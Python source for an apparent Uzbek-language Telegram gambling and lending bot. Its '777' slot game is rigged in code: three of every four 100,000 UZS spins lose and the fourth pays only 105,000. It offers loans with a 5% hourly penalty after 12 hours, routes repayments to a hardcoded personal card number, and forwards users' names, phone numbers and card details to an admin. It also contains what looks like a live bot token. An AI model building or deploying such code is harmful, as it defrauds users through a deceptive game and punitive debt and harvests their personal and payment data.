import telebot
from telebot import types
import time
from datetime import datetime, timedelta

# --- SOZLAMALAR ---
TOKEN = '8609558089:AAExgvs1_XR5jlj9RGC55zZStvc7nV_Z6hE'
ADMIN_ID = 5988166567
bot = telebot.TeleBot(TOKEN)

# Ma'lumotlar bazasi (vaqtinchalik)
users = {}
ADMIN_KARTA = "9860 6067 5582 9722" # Sizning kartangiz

def get_user(user_id):
    if user_id not in users:
        users[user_id] = {
            'reg': False, 'name': '', 'phone': '', 'balance': 0,
            'loan': 0, 'loan_time': None, 'game_count': 0, 'referrals': 0
        }
    return users[user_id]

# --- ASOSIY MENYU ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🎰 777 O'yini", "💰 Balans")
    markup.add("💳 Pul yechish", "💸 Qarz olish")
    markup.add("🏦 Qarzni to'lash", "👥 Do'stlarni taklif qilish")
    return markup

# --- 1. RO'YXATDAN O'TISH ---
@bot.message_handler(commands=['start'])
def start(message):
    user = get_user(message.chat.id)
    # Referal tizimi
    if " " in message.text:
        ref_id = int(message.text.split()[1])
        if ref_id != message.chat.id and ref_id in users:
            users[ref_id]['balance'] += 5000
            users[ref_id]['referrals'] += 1
            bot.send_message(ref_id, "🎁 Do'stingiz qo'shildi! 5,000 UZS bonus berildi.")

    if not user['reg']:
        msg = bot.send_message(message.chat.id, "Ro'yxatdan o'tish uchun Ism va Familiyangizni yozing:")
        bot.register_next_step_handler(msg, reg_name)
    else:
        bot.send_message(message.chat.id, "Xush kelibsiz!", reply_markup=main_menu())

def reg_name(message):
    user = get_user(message.chat.id)
    user['name'] = message.text
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(types.KeyboardButton("📱 Raqamni yuborish", request_contact=True))
    msg = bot.send_message(message.chat.id, "Telefon raqamingizni yuboring:", reply_markup=markup)
    bot.register_next_step_handler(msg, reg_phone)

def reg_phone(message):
    user = get_user(message.chat.id)
    if message.contact:
        user['phone'] = message.contact.phone_number
        user['reg'] = True
        bot.send_message(message.chat.id, "✅ Tayyor!", reply_markup=main_menu())
        bot.send_message(ADMIN_ID, f"🆕 Yangi user:\n👤 {user['name']}\n📞 {user['phone']}")
    else:
        bot.send_message(message.chat.id, "Iltimos, tugmani bosing!")

# --- 2. 777 O'YINI (3 mag'lubiyat, 1 g'alaba) ---
@bot.message_handler(func=lambda m: m.text == "🎰 777 O'yini")
def game_start(message):
    user = get_user(message.chat.id)
    if user['balance'] < 100000:
        bot.send_message(message.chat.id, "O'yin uchun 100,000 UZS kerak!")
        return
    
    user['balance'] -= 100000
    user['game_count'] += 1
    
    # Slot machine emojisi
    msg = bot.send_dice(message.chat.id, emoji='🎰')
    time.sleep(4)
    
    # 3 marta yutqazib, 4-sida yutish algoritmi
    if user['game_count'] % 4 == 0:
        win = 105000
        user['balance'] += win
        bot.send_message(message.chat.id, f"🎉 G'alaba! Sizga {win:,} UZS berildi.")
    else:
        bot.send_message(message.chat.id, "😟 Omadingiz kelmadi. Yana urinib ko'ring!")

# --- 3. QARZ OLISH (12 soatdan keyin 5% penya) ---
@bot.message_handler(func=lambda m: m.text == "💸 Qarz olish")
def loan_info(message):
    text = ("Qarz shartlari:\n- 12 soatgacha: 0%\n- 12 soatdan o'tsa: har soatga 5% penya\n"
            "- Min: 100,000 UZS\n- Max: 5,000,000 UZS")
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ Tasdiqlash", callback_data="loan_confirm"),
               types.InlineKeyboardButton("❌ Orqaga", callback_data="loan_cancel"))
    bot.send_message(message.chat.id, text, reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data == "loan_confirm")
def loan_get(call):
    msg = bot.send_message(call.message.chat.id, "Summani kiriting (100k - 5mln):")
    bot.register_next_step_handler(msg, loan_process)

def loan_process(message):
    try:
        amt = int(message.text)
        if 100000 <= amt <= 5000000:
            user = get_user(message.chat.id)
            user['loan'] = amt
            user['balance'] += amt
            user['loan_time'] = datetime.now()
            bot.send_message(message.chat.id, f"✅ {amt:,} UZS qarz berildi.")
        else:
            bot.send_message(message.chat.id, "Limitdan chiqdingiz!")
    except:
        bot.send_message(message.chat.id, "Faqat raqam yozing!")

# --- 4. PUL YECHISH ---
@bot.message_handler(func=lambda m: m.text == "💳 Pul yechish")
def draw_1(message):
    user = get_user(message.chat.id)
    if user['balance'] < 300000:
        bot.send_message(message.chat.id, "Minimal yechish: 300,000 UZS")
        return
    msg = bot.send_message(message.chat.id, "Karta raqami va Ismingizni yozing:")
    bot.register_next_step_handler(msg, draw_final)

def draw_final(message):
    user = get_user(message.chat.id)
    now = datetime.now()
    admin_msg = (f"💰 **Pul yechish so'rovi!**\n\n👤 {user['name']}\n📞 {user['phone']}\n"
                 f"💳 Ma'lumot: {message.text}\n⏰ Vaqt: {now.strftime('%Y-%m-%d %H:%M')}")
    bot.send_message(ADMIN_ID, admin_msg)
    bot.send_message(message.chat.id, "✅ So'rov adminga yuborildi.")

# --- 5. QARZNI TO'LASH ---
@bot.message_handler(func=lambda m: m.text == "🏦 Qarzni to'lash")
def pay_loan(message):
    user = get_user(message.chat.id)
    if user['loan'] <= 0:
        bot.send_message(message.chat.id, "Qarzingiz yo'q.")
        return
    
    # Penya hisoblash
    passed = datetime.now() - user['loan_time']
    hours = passed.total_seconds() // 3600
    current_loan = user['loan']
    if hours > 12:
        extra_hours = hours - 12
        current_loan += (user['loan'] * 0.05 * extra_hours)

    text = f"Sizning qarzingiz (penya bilan): {int(current_loan):,} UZS\nKartamiz: `{ADMIN_KARTA}`"
    msg = bot.send_message(message.chat.id, text + "\n\nTo'lov miqdorini yozing:", parse_mode="Markdown")
    bot.register_next_step_handler(msg, pay_admin_confirm, int(current_loan))

def pay_admin_confirm(message, total_needed):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ TASDIQLASH", callback_data=f"l_ok_{message.chat.id}"),
               types.InlineKeyboardButton("❌ RAD ETISH", callback_data=f"l_no_{message.chat.id}"))
    bot.send_message(ADMIN_ID, f"🏦 Qarz to'lash so'rovi!\nUser: {message.chat.id}\nSumma: {message.text}", reply_markup=markup)
    bot.send_message(message.chat.id, "✅ To'lov tekshirilmoqda...")

@bot.callback_query_handler(func=lambda c: c.data.startswith("l_"))
def admin_decision(call):
    action, uid = call.data.split("_")[1], int(call.data.split("_")[2])
    if action == "ok":
        users[uid]['loan'] = 0
        users[uid]['loan_time'] = None
        bot.send_message(uid, "✅ Qarzingiz yopildi!")
    else:
        bot.send_message(uid, "❌ To'lov tasdiqlanmadi!")

# --- QO'SHIMCHA ---
@bot.message_handler(func=lambda m: m.text == "💰 Balans")
def bal(message):
    user = get_user(message.chat.id)
    bot.send_message(message.chat.id, f"💰 Balans: {user['balance']:,} UZS\n💸 Qarz: {user['loan']:,} UZS")

@bot.message_handler(func=lambda m: m.text == "👥 Do'stlarni taklif qilish")
def invite(message):
    link = f"https://t.me/{(bot.get_me()).username}?start={message.chat.id}"
    bot.send_message(message.chat.id, f"Sizning taklif havolangiz:\n{link}\n\nHar bir do'st uchun 5,000 UZS bonus!")

bot.polling(none_stop=True)
            
       

    
            
        
        
    
  
